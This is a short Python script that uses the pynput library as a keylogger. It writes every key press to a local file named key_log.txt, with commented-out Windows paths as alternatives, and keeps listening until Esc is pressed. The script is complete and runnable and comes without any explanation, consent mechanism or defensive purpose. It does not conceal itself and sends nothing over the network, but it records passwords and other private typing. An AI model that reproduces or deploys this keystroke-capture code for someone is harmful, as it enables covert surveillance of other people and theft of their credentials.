#pip install pynput

from pynput import keyboard

# File to store the logged keys
log_file = "key_log.txt"
#log_file = "C:\\Users\\YourUsername\\Documents\\key_log.txt"
#log_file = r"C:\Users\YourUsername\Documents\key_log.txt"
#log_file = r"C:\key_log.txt"



# Function to handle key press events
def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}\n')
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f'{key}\n')

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when Esc key is pressed
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
